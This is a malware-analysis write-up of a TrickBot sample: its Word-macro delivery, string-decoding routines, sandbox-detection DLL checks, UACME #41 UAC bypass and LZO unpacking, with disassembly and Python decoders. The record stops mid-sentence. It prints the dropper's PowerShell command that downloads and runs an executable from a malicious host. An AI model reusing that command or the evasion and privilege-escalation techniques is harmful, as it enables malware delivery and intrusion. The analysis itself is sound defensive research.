{
    "id": "f59ba882-e4e7-4956-b547-9c6cb479602b",
    "created_at": "2023-01-12T15:08:54.302103Z",
    "updated_at": "2025-03-27T02:05:24.644922Z",
    "deleted_at": null,
    "sha1_hash": "5939fd35434e2a4cb510511f5dd5668d79a3c2c6",
    "title": "2018-04-16 - TrickBot & UACME",
    "authors": "",
    "file_creation_date": "2022-05-28T21:41:05Z",
    "file_modification_date": "2022-05-28T21:41:05Z",
    "file_size": 137105,
    "plain_text": "# TrickBot & UACME\n\n**sysopfb.github.io/malware/2018/04/16/trickbot-uacme.html**\n\nRandom RE April 16, 2018\n\n### Apr 16, 2018\n\n## TrickBot Secure Message Delivery 12apr2018\n\n### Doc delivery: 3782f96c6d9f3136651da208465fa939313b7e4f21bdc4ef10c05926e0428a65\n```\n'\"\" | Out-File -encoding ASCII -FilePath %TEMP%\\bpknnhvxb_cx.bat;Start-Process '%TEMP%\\bpknnhvxb_cx.bat' WindowStyle Hidden\" (PID: 3320)\ncmd.exe /c \"\"%TEMP%\\bpknnhvxb_cx.bat\" \" (PID: 4568)\npowershell.exe PowerShell \"function ggft([String] $uibzkllsrb5)\n{(New-Object System.Net.WebClient).DownloadFile($uibzkllsrb5,'%TEMP%\\sethasn2.exe');Start-Process\n'%TEMP%\\sethasn2.exe';}\nm-tensou[.]net/svoren.png - 2153be5c6f73f4816d90809febf4122a7b065cbfddaa4e2bf5935277341af34c\n\n Macro uses a custom string lookup\nVBA FORM STRING IN '3782f96c6d9f3136651da208465fa939313b.doc' - OLE stream: u'Macros/wordapollo/o'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \nqwertyuiop[]asdfghjkl;zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"ZXCVBNM<>?!@#$%^&*()\\1234567890 -|'\nk = \"\"\"qwertyuiop[]asdfghjkl;zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"ZXCVBNM<>?!@#$%^&*()\\1234567890 -|'\"\"\"\nblah = 'Qwou/ha[E/uoRh,aiu/Es/l'\nout = \"\"\nfor i in range(len(blah)):\n temp = k.index(blah[i])\n out += k[(temp-4)%len(k)]\nprint(out)\nm-tensou.net/svoren.png\n\n## Trick payload\n\n### 2153be5c6f73f4816d90809febf4122a7b065cbfddaa4e2bf5935277341af34c Sample has multiple internal layers on the crypter along with a function decoding layer that decodes out each individual function as it needs it.\n\n Checks for the prescence of the following DLLs by parsing them from the PEB\n\n pstorec.dll vmcheck.dll dbghelp.dll wpespy.dll api_log.dll SbieDll.dll SxIn.dll dir_watch.dll Sf2.dll cmdvrt32.dll snxhk.dll\n\n## Loader Functions\n\n### Function that parses all unicode DLLs from PEB and then compares it with a passed in string\n\n```\n\n-----\n\n```\n                    ,\n01DB04AD  C745 F4 00000000 MOV DWORD PTR SS:[EBP-C],0\n01DB04B4  64:A1 30000000  MOV EAX,DWORD PTR FS:[30]\n01DB04BA  8945 F4     MOV DWORD PTR SS:[EBP-C],EAX\n01DB04BD  C745 F8 00000000 MOV DWORD PTR SS:[EBP-8],0\n01DB04C4  C745 FC 00000000 MOV DWORD PTR SS:[EBP-4],0\n01DB04CB  C745 F0 00000000 MOV DWORD PTR SS:[EBP-10],0\n01DB04D2  837D F4 00    CMP DWORD PTR SS:[EBP-C],0\n01DB04D6  74 5E      JE SHORT 01DB0536\n01DB04D8  8B4D F4     MOV ECX,DWORD PTR SS:[EBP-C]\n01DB04DB  8B51 0C     MOV EDX,DWORD PTR DS:[ECX+C]\n01DB04DE  83C2 14     ADD EDX,14\n01DB04E1  8955 F8     MOV DWORD PTR SS:[EBP-8],EDX\n01DB04E4  8B45 F8     MOV EAX,DWORD PTR SS:[EBP-8]\n01DB04E7  8B08       MOV ECX,DWORD PTR DS:[EAX]\n01DB04E9  894D FC     MOV DWORD PTR SS:[EBP-4],ECX\n01DB04EC  837D F8 00    CMP DWORD PTR SS:[EBP-8],0\n01DB04F0  74 44      JE SHORT 01DB0536\n01DB04F2  837D FC 00    CMP DWORD PTR SS:[EBP-4],0\n01DB04F6  74 3E      JE SHORT 01DB0536\n01DB04F8  8B55 F8     MOV EDX,DWORD PTR SS:[EBP-8]\n01DB04FB  3B55 FC     CMP EDX,DWORD PTR SS:[EBP-4]\n01DB04FE  74 36      JE SHORT 01DB0536\n01DB0500  8B45 FC     MOV EAX,DWORD PTR SS:[EBP-4]\n01DB0503  83E8 08     SUB EAX,8\n01DB0506  8945 F0     MOV DWORD PTR SS:[EBP-10],EAX\n01DB0509  74 21      JE SHORT 01DB052C\n01DB050B  8B4D 08     MOV ECX,DWORD PTR SS:[EBP+8]\n01DB050E  51        PUSH ECX\n01DB050F  8B55 F0     MOV EDX,DWORD PTR SS:[EBP-10]\n01DB0512  8B42 30     MOV EAX,DWORD PTR DS:[EDX+30]\n01DB0515  50        PUSH EAX\n01DB0516  6A 14      PUSH 14\n01DB0518  E8 BB0BFFFF   CALL 01DA10D8\n01DB051D  83C4 08     ADD ESP,8\n01DB0520  85C0       TEST EAX,EAX\n01DB0522  74 08      JE SHORT 01DB052C\n01DB0524  8B4D F0     MOV ECX,DWORD PTR SS:[EBP-10]\n01DB0527  8B41 18     MOV EAX,DWORD PTR DS:[ECX+18]\n01DB052A  EB 0C      JMP SHORT 01DB0538\n01DB052C  8B55 FC     MOV EDX,DWORD PTR SS:[EBP-4]\n01DB052F  8B02       MOV EAX,DWORD PTR DS:[EDX]\n01DB0531  8945 FC     MOV DWORD PTR SS:[EBP-4],EAX\n01DB0534 ^EB C2      JMP SHORT 01DB04F8\n01DB0536  33C0       XOR EAX,EAX\n01DB0538  8BE5       MOV ESP,EBP\n01DB053A  5D        POP EBP\n01DB053B  C3        RETN\n\n### String decoding is base64 with a custom alphabet:\n\n```\n\n-----\n\n```\n                    , [ ]\n01DA252F  83E9 01     SUB ECX,1\n01DA2532  894D E0     MOV DWORD PTR SS:[EBP-20],ECX\n01DA2535  85C0       TEST EAX,EAX\n01DA2537  0F84 00010000  JE 01DA263D\n01DA253D  8B55 08     MOV EDX,DWORD PTR SS:[EBP+8]\n01DA2540  0355 F8     ADD EDX,DWORD PTR SS:[EBP-8]\n01DA2543  8B45 FC     MOV EAX,DWORD PTR SS:[EBP-4]\n01DA2546  8A0A       MOV CL,BYTE PTR DS:[EDX]\n01DA2548  884C28 E4    MOV BYTE PTR DS:[EAX+EBP-1C],CL\n01DA254C  8B55 FC     MOV EDX,DWORD PTR SS:[EBP-4]\n01DA254F  83C2 01     ADD EDX,1\n01DA2552  8955 FC     MOV DWORD PTR SS:[EBP-4],EDX\n01DA2555  8B45 F8     MOV EAX,DWORD PTR SS:[EBP-8]\n01DA2558  83C0 01     ADD EAX,1\n01DA255B  8945 F8     MOV DWORD PTR SS:[EBP-8],EAX\n01DA255E  837D FC 04    CMP DWORD PTR SS:[EBP-4],4\n01DA2562  0F85 D0000000  JNZ 01DA2638\n01DA2568  C745 FC 00000000 MOV DWORD PTR SS:[EBP-4],0\n01DA256F  EB 09      JMP SHORT 01DA257A\n01DA2571  8B4D FC     MOV ECX,DWORD PTR SS:[EBP-4]\n01DA2574  83C1 01     ADD ECX,1\n01DA2577  894D FC     MOV DWORD PTR SS:[EBP-4],ECX\n01DA257A  837D FC 04    CMP DWORD PTR SS:[EBP-4],4\n01DA257E  7D 42      JGE SHORT 01DA25C2\n01DA2580  C745 DC 00000000 MOV DWORD PTR SS:[EBP-24],0\n01DA2587  8B55 F4     MOV EDX,DWORD PTR SS:[EBP-C]\n01DA258A  0355 DC     ADD EDX,DWORD PTR SS:[EBP-24]\n01DA258D  0FBE02      MOVSX EAX,BYTE PTR DS:[EDX]\n01DA2590  85C0       TEST EAX,EAX\n01DA2592  74 2C      JE SHORT 01DA25C0\n01DA2594  8B4D F4     MOV ECX,DWORD PTR SS:[EBP-C]\n01DA2597  034D DC     ADD ECX,DWORD PTR SS:[EBP-24]\n01DA259A  0FBE11      MOVSX EDX,BYTE PTR DS:[ECX]\n01DA259D  8B45 FC     MOV EAX,DWORD PTR SS:[EBP-4]\n01DA25A0  0FBE4C28 E4   MOVSX ECX,BYTE PTR DS:[EAX+EBP-1C]\n01DA25A5  3BD1       CMP EDX,ECX\n01DA25A7  75 0C      JNZ SHORT 01DA25B5\n01DA25A9  8B55 FC     MOV EDX,DWORD PTR SS:[EBP-4]\n01DA25AC  8A45 DC     MOV AL,BYTE PTR SS:[EBP-24]\n01DA25AF  88442A E4    MOV BYTE PTR DS:[EDX+EBP-1C],AL\n01DA25B3  EB 0B      JMP SHORT 01DA25C0\n01DA25B5  8B4D DC     MOV ECX,DWORD PTR SS:[EBP-24]\n01DA25B8  83C1 01     ADD ECX,1\n01DA25BB  894D DC     MOV DWORD PTR SS:[EBP-24],ECX\n01DA25BE ^EB C7      JMP SHORT 01DA2587\n01DA25C0 ^EB AF      JMP SHORT 01DA2571\n01DA25C2  0FBE55 E4    MOVSX EDX,BYTE PTR SS:[EBP-1C]\n01DA25C6  0FBE45 E5    MOVSX EAX,BYTE PTR SS:[EBP-1B]\n01DA25CA  83E0 30     AND EAX,30\n01DA25CD  C1F8 04     SAR EAX,4\n01DA25D0  8D0C90      LEA ECX,DWORD PTR DS:[EAX+EDX*4]\n01DA25D3  884D EC     MOV BYTE PTR SS:[EBP-14],CL\n01DA25D6  0FBE55 E5    MOVSX EDX,BYTE PTR SS:[EBP-1B]\n01DA25DA  83E2 0F     AND EDX,0F\n01DA25DD  C1E2 04     SHL EDX,4\n01DA25E0  0FBE45 E6    MOVSX EAX,BYTE PTR SS:[EBP-1A]\n01DA25E4  83E0 3C     AND EAX,3C\n01DA25E7  C1F8 02     SAR EAX,2\n01DA25EA  03D0       ADD EDX,EAX\n01DA25EC  8855 ED     MOV BYTE PTR SS:[EBP-13],DL\n01DA25EF  0FBE4D E6    MOVSX ECX,BYTE PTR SS:[EBP-1A]\n01DA25F3  83E1 03     AND ECX,3\n01DA25F6  C1E1 06     SHL ECX,6\n01DA25F9  0FBE55 E7    MOVSX EDX,BYTE PTR SS:[EBP-19]\n01DA25FD  03CA       ADD ECX,EDX\n01DA25FF  884D EE     MOV BYTE PTR SS:[EBP-12],CL\n01DA2602  C745 FC 00000000 MOV DWORD PTR SS:[EBP-4],0\n01DA2609 EB 09 JMP SHORT 01DA2614\n\n```\n\n-----\n\n```\n                    , [ ]\n01DA260E  83C0 01     ADD EAX,1\n01DA2611  8945 FC     MOV DWORD PTR SS:[EBP-4],EAX\n01DA2614  837D FC 03    CMP DWORD PTR SS:[EBP-4],3\n01DA2618  7D 17      JGE SHORT 01DA2631\n01DA261A  8B4D E8     MOV ECX,DWORD PTR SS:[EBP-18]\n01DA261D  8B55 FC     MOV EDX,DWORD PTR SS:[EBP-4]\n01DA2620  8A442A EC    MOV AL,BYTE PTR DS:[EDX+EBP-14]\n01DA2624  8801       MOV BYTE PTR DS:[ECX],AL\n01DA2626  8B4D E8     MOV ECX,DWORD PTR SS:[EBP-18]\n01DA2629  83C1 01     ADD ECX,1\n01DA262C  894D E8     MOV DWORD PTR SS:[EBP-18],ECX\n01DA262F ^EB DA      JMP SHORT 01DA260B\n01DA2631  C745 FC 00000000 MOV DWORD PTR SS:[EBP-4],0\n01DA2638 ^E9 ECFEFFFF   JMP 01DA2529\n01DA263D  837D FC 00    CMP DWORD PTR SS:[EBP-4],0\n01DA2641  0F84 F6000000  JE 01DA273D\n01DA2647  8B55 FC     MOV EDX,DWORD PTR SS:[EBP-4]\n01DA264A  8955 DC     MOV DWORD PTR SS:[EBP-24],EDX\n01DA264D  EB 09      JMP SHORT 01DA2658\n01DA264F  8B45 DC     MOV EAX,DWORD PTR SS:[EBP-24]\n01DA2652  83C0 01     ADD EAX,1\n01DA2655  8945 DC     MOV DWORD PTR SS:[EBP-24],EAX\n01DA2658  837D DC 04    CMP DWORD PTR SS:[EBP-24],4\n01DA265C  7D 0A      JGE SHORT 01DA2668\n01DA265E  8B4D DC     MOV ECX,DWORD PTR SS:[EBP-24]\n01DA2661  C64429 E4 00   MOV BYTE PTR DS:[ECX+EBP-1C],0\n01DA2666 ^EB E7      JMP SHORT 01DA264F\n01DA2668  C745 DC 00000000 MOV DWORD PTR SS:[EBP-24],0\n01DA266F  EB 09      JMP SHORT 01DA267A\n01DA2671  8B55 DC     MOV EDX,DWORD PTR SS:[EBP-24]\n01DA2674  83C2 01     ADD EDX,1\n01DA2677  8955 DC     MOV DWORD PTR SS:[EBP-24],EDX\n01DA267A  837D DC 04    CMP DWORD PTR SS:[EBP-24],4\n01DA267E  7D 49      JGE SHORT 01DA26C9\n01DA2680  C745 D4 00000000 MOV DWORD PTR SS:[EBP-2C],0\n01DA2687  C745 D8 4637DC01 MOV DWORD PTR SS:[EBP-28],1DC3746    ; ASCII\n\"56tAMJ1GmOs3TK20g4I+ueRbpwqjNBVxzynF7hardSDEL9PvfoXiZl8/HYUCQckW\"\n01DA268E  8B45 D8     MOV EAX,DWORD PTR SS:[EBP-28]\n01DA2691  0345 D4     ADD EAX,DWORD PTR SS:[EBP-2C]\n01DA2694  0FBE08      MOVSX ECX,BYTE PTR DS:[EAX]\n01DA2697  85C9       TEST ECX,ECX\n01DA2699  74 2C      JE SHORT 01DA26C7\n01DA269B  8B55 D8     MOV EDX,DWORD PTR SS:[EBP-28]\n01DA269E  0355 D4     ADD EDX,DWORD PTR SS:[EBP-2C]\n01DA26A1  0FBE02      MOVSX EAX,BYTE PTR DS:[EDX]\n01DA26A4  8B4D DC     MOV ECX,DWORD PTR SS:[EBP-24]\n01DA26A7  0FBE5429 E4   MOVSX EDX,BYTE PTR DS:[ECX+EBP-1C]\n01DA26AC  3BC2       CMP EAX,EDX\n01DA26AE  75 0C      JNZ SHORT 01DA26BC\n01DA26B0  8B45 DC     MOV EAX,DWORD PTR SS:[EBP-24]\n01DA26B3  8A4D D4     MOV CL,BYTE PTR SS:[EBP-2C]\n01DA26B6  884C28 E4    MOV BYTE PTR DS:[EAX+EBP-1C],CL\n01DA26BA  EB 0B      JMP SHORT 01DA26C7\n01DA26BC  8B55 D4     MOV EDX,DWORD PTR SS:[EBP-2C]\n01DA26BF  83C2 01     ADD EDX,1\n01DA26C2  8955 D4     MOV DWORD PTR SS:[EBP-2C],EDX\n01DA26C5 ^EB C7      JMP SHORT 01DA268E\n01DA26C7 ^EB A8      JMP SHORT 01DA2671\n01DA26C9  0FBE45 E4    MOVSX EAX,BYTE PTR SS:[EBP-1C]\n01DA26CD  0FBE4D E5    MOVSX ECX,BYTE PTR SS:[EBP-1B]\n01DA26D1  83E1 30     AND ECX,30\n01DA26D4  C1F9 04     SAR ECX,4\n01DA26D7  8D1481      LEA EDX,DWORD PTR DS:[ECX+EAX*4]\n01DA26DA  8855 EC     MOV BYTE PTR SS:[EBP-14],DL\n01DA26DD  0FBE45 E5    MOVSX EAX,BYTE PTR SS:[EBP-1B]\n01DA26E1  83E0 0F     AND EAX,0F\n01DA26E4  C1E0 04     SHL EAX,4\n01DA26E7 0FBE4D E6 MOVSX ECX BYTE PTR SS [EBP 1A]\n\n```\n\n-----\n\n```\n                    ,\n01DA26EE  C1F9 02     SAR ECX,2\n01DA26F1  03C1       ADD EAX,ECX\n01DA26F3  8845 ED     MOV BYTE PTR SS:[EBP-13],AL\n01DA26F6  0FBE55 E6    MOVSX EDX,BYTE PTR SS:[EBP-1A]\n01DA26FA  83E2 03     AND EDX,3\n01DA26FD  C1E2 06     SHL EDX,6\n01DA2700  0FBE45 E7    MOVSX EAX,BYTE PTR SS:[EBP-19]\n01DA2704  03D0       ADD EDX,EAX\n01DA2706  8855 EE     MOV BYTE PTR SS:[EBP-12],DL\n01DA2709  C745 DC 00000000 MOV DWORD PTR SS:[EBP-24],0\n01DA2710  EB 09      JMP SHORT 01DA271B\n01DA2712  8B4D DC     MOV ECX,DWORD PTR SS:[EBP-24]\n01DA2715  83C1 01     ADD ECX,1\n01DA2718  894D DC     MOV DWORD PTR SS:[EBP-24],ECX\n01DA271B  8B55 FC     MOV EDX,DWORD PTR SS:[EBP-4]\n01DA271E  83EA 01     SUB EDX,1\n01DA2721  3955 DC     CMP DWORD PTR SS:[EBP-24],EDX\n01DA2724  7D 17      JGE SHORT 01DA273D\n01DA2726  8B45 E8     MOV EAX,DWORD PTR SS:[EBP-18]\n01DA2729  8B4D DC     MOV ECX,DWORD PTR SS:[EBP-24]\n01DA272C  8A5429 EC    MOV DL,BYTE PTR DS:[ECX+EBP-14]\n01DA2730  8810       MOV BYTE PTR DS:[EAX],DL\n01DA2732  8B45 E8     MOV EAX,DWORD PTR SS:[EBP-18]\n01DA2735  83C0 01     ADD EAX,1\n01DA2738  8945 E8     MOV DWORD PTR SS:[EBP-18],EAX\n01DA273B ^EB D5      JMP SHORT 01DA2712\n01DA273D  8B4D E8     MOV ECX,DWORD PTR SS:[EBP-18]\n01DA2740  C601 00     MOV BYTE PTR DS:[ECX],0\n01DA2743  8B45 E8     MOV EAX,DWORD PTR SS:[EBP-18]\n01DA2746  2B45 0C     SUB EAX,DWORD PTR SS:[EBP+C]\n01DA2749  8BE5       MOV ESP,EBP\n01DA274B  5D        POP EBP\n01DA274C  C3        RETN\nimport base64\ndata =\n'N8yhj1fiTnY7j1f\\x00jr47j1fPw1oL\\x00N8yLB8JfqIY7j1f\\x00pR48pb6STimPw1oL\\x00gFpZ\\x00Tg\\x00Tz\\x00N/wFq1ciBtYhV\nkey = '56tAMJ1GmOs3TK20g4I+ueRbpwqjNBVxzynF7hardSDEL9PvfoXiZl8/HYUCQckW'\nstd_b64 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\nfor s in data.split('\\x00'):\n  s = s.translate(str.maketrans(key,std_b64))\n  if len(s)%4 != 0:\n    s += '='*(4 - len(s)%4)\n  print(base64.b64decode(s))\n\n```\n\n-----\n\n```\nb'ntdll.dll'\nb'shlwapi.dll'\nb'advapi32.dll'\nb'B64'\nb'1'\nb'2'\nb'svchost.exe'\nb'\\\\NetViewer'\nb'pstorec.dll'\nb'vmcheck.dll'\nb'dbghelp.dll'\nb'wpespy.dll'\nb'api_log.dll'\nb'SbieDll.dll'\nb'SxIn.dll'\nb'dir_watch.dll'\nb'Sf2.dll'\nb'cmdvrt32.dll'\nb'snxhk.dll'\nb'MSEDGE'\nb'IEUser'\nb'SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\'\nb'ProductName'\nb'Evaluation'\nb'SOFTWARE\\\\Microsoft\\\\Virtual Machine'\nb'{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'\nb'{6EDD6D74-C007-4E75-B76A-E5740995E24C}'\nb'explorer.exe'\nb'bloody booty bla de bludy botty bla lhe capitaine bloode!'\nb'ole32.dll'\nb'wtsapi32'\nb'WTSEnumerateSessionsA'\nb'WTSFreeMemory'\nb'WTSGetActiveConsoleSessionId'\nb'WTSQueryUserToken'\nb'SeTcbPrivilege'\nb'Elevation:Administrator!new:'\nb'.log'\n\n### Checks if local system https://github.com/hfiref0x/UACME/blob/b8c4c71e1ba3b6646a48c0b655ce6d6e388c6112/Source/Shared/util.c\n          status = RtlAllocateAndInitializeSid(\n            &SECURITY_NT_AUTHORITY,\n            1,\n            SECURITY_LOCAL_SYSTEM_RID,\n            0, 0, 0, 0, 0, 0, 0,\n&SystemSid);\n\n Also some strings based on UACME #41, which was reported on by F-secure in December of last year[1]. Around the same time #41 was also added to IcedId in late November of 2017[2]\n\n If SID not matches then it checks if it’s running out of %AppData%. If not then it checks if it’s running out of system32 or else it copies itself over to %AppData% into a NetViewer folder after slightly manipulating it’s filename in the process. Afterwords it checks what elevation level it is running at by using similar code as supGetElevationType from UACME[5]. If it’s executing as TokenElevationTypeLimited then it moves into using #41 from UACME.\n\n```\n\n-----\n\n### I let it run all the way up until it was about to call ShellExec on the COM object and then changed the malicious binary location with cmd.exe for a pretty picture:\n\n If that lines up then a XOR encoded compressed PE file is decoded out using the same encoding routine used on the functions.\n\n Next it’s decompressed using LZO, the code used matches up with the code that was utilized by Dyreza but since code share has already been found it wouldn’t be abnormal for them to reuse libraries they already had on hand. Appears to be from MiniLZO but a common compression library so hard to tell specifically. Also of note is the same decompression routine is utilized to decompress the loader bytecode as well.\n\n Decompression code:\n\n\n-----\n\n```\n01DB31DF  56        PUSH ESI\n01DB31E0  53        PUSH EBX\n01DB31E1  51        PUSH ECX\n01DB31E2  52        PUSH EDX\n01DB31E3  83EC 0C     SUB ESP,0C\n01DB31E6  FC        CLD\n01DB31E7  8B7424 28    MOV ESI,DWORD PTR SS:[ESP+28]\n01DB31EB  8B7C24 30    MOV EDI,DWORD PTR SS:[ESP+30]\n01DB31EF  BD 03000000   MOV EBP,3\n01DB31F4  31C0       XOR EAX,EAX\n01DB31F6  31DB       XOR EBX,EBX\n01DB31F8  AC        LODS BYTE PTR DS:[ESI]\n01DB31F9  3C 11      CMP AL,11\n01DB31FB  76 1B      JBE SHORT 01DB3218\n01DB31FD  2C 0E      SUB AL,0E\n01DB31FF  EB 22      JMP SHORT 01DB3223\n01DB3201  05 FF000000   ADD EAX,0FF\n01DB3206  8A1E       MOV BL,BYTE PTR DS:[ESI]\n01DB3208  46        INC ESI\n01DB3209  08DB       OR BL,BL\n01DB320B ^74 F4      JE SHORT 01DB3201\n01DB320D  8D4418 15    LEA EAX,DWORD PTR DS:[EAX+EBX+15]\n01DB3211  EB 10      JMP SHORT 01DB3223\n01DB3213  89F6       MOV ESI,ESI\n01DB3215  8A06       MOV AL,BYTE PTR DS:[ESI]\n01DB3217  46        INC ESI\n01DB3218  3C 10      CMP AL,10\n01DB321A  73 41      JNB SHORT 01DB325D\n01DB321C  08C0       OR AL,AL\n01DB321E ^74 E6      JE SHORT 01DB3206\n01DB3220  83C0 06     ADD EAX,6\n01DB3223  89C1       MOV ECX,EAX\n01DB3225  31E8       XOR EAX,EBP\n01DB3227  C1E9 02     SHR ECX,2\n01DB322A  21E8       AND EAX,EBP\n01DB322C  8B16       MOV EDX,DWORD PTR DS:[ESI]\n01DB322E  83C6 04     ADD ESI,4\n01DB3231  8917       MOV DWORD PTR DS:[EDI],EDX\n01DB3233  83C7 04     ADD EDI,4\n01DB3236  49        DEC ECX\n01DB3237 ^75 F3      JNZ SHORT 01DB322C\n01DB3239  29C6       SUB ESI,EAX\n01DB323B  29C7       SUB EDI,EAX\n01DB323D  8A06       MOV AL,BYTE PTR DS:[ESI]\n01DB323F  46        INC ESI\n01DB3240  3C 10      CMP AL,10\n01DB3242  73 19      JNB SHORT 01DB325D\n01DB3244  C1E8 02     SHR EAX,2\n01DB3247  8A1E       MOV BL,BYTE PTR DS:[ESI]\n01DB3249  8D97 FFF7FFFF  LEA EDX,DWORD PTR DS:[EDI-801]\n01DB324F  8D0498      LEA EAX,DWORD PTR DS:[EAX+EBX*4]\n01DB3252  46        INC ESI\n01DB3253  29C2       SUB EDX,EAX\n01DB3255  8B0A       MOV ECX,DWORD PTR DS:[EDX]\n01DB3257  890F       MOV DWORD PTR DS:[EDI],ECX\n01DB3259  01EF       ADD EDI,EBP\n01DB325B  EB 6E      JMP SHORT 01DB32CB\n01DB325D  3C 40      CMP AL,40\n01DB325F  72 34      JB SHORT 01DB3295\n01DB3261  89C1       MOV ECX,EAX\n01DB3263  C1E8 02     SHR EAX,2\n01DB3266  8D57 FF     LEA EDX,DWORD PTR DS:[EDI-1]\n01DB3269  83E0 07     AND EAX,7\n01DB326C  8A1E       MOV BL,BYTE PTR DS:[ESI]\n01DB326E  C1E9 05     SHR ECX,5\n01DB3271  8D04D8      LEA EAX,DWORD PTR DS:[EAX+EBX*8]\n01DB3274  46        INC ESI\n01DB3275 29C2 SUB EDX EAX\n\n```\n\n-----\n\n```\n                    ,\n01DB327A  39E8       CMP EAX,EBP\n01DB327C  73 35      JNB SHORT 01DB32B3\n01DB327E  EB 6D      JMP SHORT 01DB32ED\n01DB3280  05 FF000000   ADD EAX,0FF\n01DB3285  8A1E       MOV BL,BYTE PTR DS:[ESI]\n01DB3287  46        INC ESI\n01DB3288  08DB       OR BL,BL\n01DB328A ^74 F4      JE SHORT 01DB3280\n01DB328C  8D4C18 24    LEA ECX,DWORD PTR DS:[EAX+EBX+24]\n01DB3290  31C0       XOR EAX,EAX\n01DB3292  EB 0D      JMP SHORT 01DB32A1\n01DB3294  90        NOP\n01DB3295  3C 20      CMP AL,20\n01DB3297  72 74      JB SHORT 01DB330D\n01DB3299  83E0 1F     AND EAX,1F\n01DB329C ^74 E7      JE SHORT 01DB3285\n01DB329E  8D48 05     LEA ECX,DWORD PTR DS:[EAX+5]\n01DB32A1  66:8B06     MOV AX,WORD PTR DS:[ESI]\n01DB32A4  8D57 FF     LEA EDX,DWORD PTR DS:[EDI-1]\n01DB32A7  C1E8 02     SHR EAX,2\n01DB32AA  83C6 02     ADD ESI,2\n01DB32AD  29C2       SUB EDX,EAX\n01DB32AF  39E8       CMP EAX,EBP\n01DB32B1  72 3A      JB SHORT 01DB32ED\n01DB32B3  8D440F FD    LEA EAX,DWORD PTR DS:[EDI+ECX-3]\n01DB32B7  C1E9 02     SHR ECX,2\n01DB32BA  8B1A       MOV EBX,DWORD PTR DS:[EDX]\n01DB32BC  83C2 04     ADD EDX,4\n01DB32BF  891F       MOV DWORD PTR DS:[EDI],EBX\n01DB32C1  83C7 04     ADD EDI,4\n01DB32C4  49        DEC ECX\n01DB32C5 ^75 F3      JNZ SHORT 01DB32BA\n01DB32C7  89C7       MOV EDI,EAX\n01DB32C9  31DB       XOR EBX,EBX\n01DB32CB  8A46 FE     MOV AL,BYTE PTR DS:[ESI-2]\n01DB32CE  21E8       AND EAX,EBP\n01DB32D0 ^0F84 3FFFFFFF  JE 01DB3215\n01DB32D6  8B16       MOV EDX,DWORD PTR DS:[ESI]\n01DB32D8  01C6       ADD ESI,EAX\n01DB32DA  8917       MOV DWORD PTR DS:[EDI],EDX\n01DB32DC  01C7       ADD EDI,EAX\n01DB32DE  8A06       MOV AL,BYTE PTR DS:[ESI]\n01DB32E0  46        INC ESI\n01DB32E1 ^E9 77FFFFFF   JMP 01DB325D\n01DB32E6  8DB426 00000000 LEA ESI,DWORD PTR DS:[ESI]\n01DB32ED  87D6       XCHG ESI,EDX\n01DB32EF  29E9       SUB ECX,EBP\n01DB32F1  F3:A4      REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[>\n01DB32F3  89D6       MOV ESI,EDX\n01DB32F5 ^EB D4      JMP SHORT 01DB32CB\n01DB32F7  81C1 FF000000  ADD ECX,0FF\n01DB32FD  8A1E       MOV BL,BYTE PTR DS:[ESI]\n01DB32FF  46        INC ESI\n01DB3300  08DB       OR BL,BL\n01DB3302 ^74 F3      JE SHORT 01DB32F7\n01DB3304  8D4C0B 0C    LEA ECX,DWORD PTR DS:[EBX+ECX+C]\n01DB3308  EB 17      JMP SHORT 01DB3321\n01DB330A  8D76 00     LEA ESI,DWORD PTR DS:[ESI]\n01DB330D  3C 10      CMP AL,10\n01DB330F  72 2C      JB SHORT 01DB333D\n01DB3311  89C1       MOV ECX,EAX\n01DB3313  83E0 08     AND EAX,8\n01DB3316  C1E0 0D     SHL EAX,0D\n01DB3319  83E1 07     AND ECX,7\n01DB331C ^74 DF      JE SHORT 01DB32FD\n01DB331E  83C1 05     ADD ECX,5\n01DB3321  66:8B06     MOV AX,WORD PTR DS:[ESI]\n01DB3324 83C6 02 ADD ESI 2\n\n```\n\n-----\n\n```\n                    , [ ]\n01DB332D  C1E8 02     SHR EAX,2\n01DB3330  74 2B      JE SHORT 01DB335D\n01DB3332  29C2       SUB EDX,EAX\n01DB3334 ^E9 7AFFFFFF   JMP 01DB32B3\n01DB3339  8D7426 00    LEA ESI,DWORD PTR DS:[ESI]\n01DB333D  C1E8 02     SHR EAX,2\n01DB3340  8A1E       MOV BL,BYTE PTR DS:[ESI]\n01DB3342  8D57 FF     LEA EDX,DWORD PTR DS:[EDI-1]\n01DB3345  8D0498      LEA EAX,DWORD PTR DS:[EAX+EBX*4]\n01DB3348  46        INC ESI\n01DB3349  29C2       SUB EDX,EAX\n01DB334B  8A02       MOV AL,BYTE PTR DS:[EDX]\n01DB334D  8807       MOV BYTE PTR DS:[EDI],AL\n01DB334F  8A5A 01     MOV BL,BYTE PTR DS:[EDX+1]\n01DB3352  885F 01     MOV BYTE PTR DS:[EDI+1],BL\n01DB3355  83C7 02     ADD EDI,2\n01DB3358 ^E9 6EFFFFFF   JMP 01DB32CB\n01DB335D  83F9 06     CMP ECX,6\n01DB3360  0F95C0      SETNE AL\n01DB3363  8B5424 28    MOV EDX,DWORD PTR SS:[ESP+28]\n01DB3367  035424 2C    ADD EDX,DWORD PTR SS:[ESP+2C]\n01DB336B  39D6       CMP ESI,EDX\n01DB336D  77 26      JA SHORT 01DB3395\n01DB336F  72 1D      JB SHORT 01DB338E\n01DB3371  2B7C24 30    SUB EDI,DWORD PTR SS:[ESP+30]\n01DB3375  8B5424 34    MOV EDX,DWORD PTR SS:[ESP+34]\n01DB3379  893A       MOV DWORD PTR DS:[EDX],EDI\n01DB337B  F7D8       NEG EAX\n01DB337D  83C4 0C     ADD ESP,0C\n01DB3380  5A        POP EDX\n01DB3381  59        POP ECX\n01DB3382  5B        POP EBX\n01DB3383  5E        POP ESI\n01DB3384  5F        POP EDI\n01DB3385  5D        POP EBP\n01DB3386  C3        RETN\n01DB3387  B8 01000000   MOV EAX,1\n01DB338C ^EB E3      JMP SHORT 01DB3371\n01DB338E  B8 08000000   MOV EAX,8\n01DB3393 ^EB DC      JMP SHORT 01DB3371\n01DB3395  B8 04000000   MOV EAX,4\n01DB339A ^EB D5      JMP SHORT 01DB3371\n\n### If running in WOW64 then another smaller 64 bit EXE is decoded and 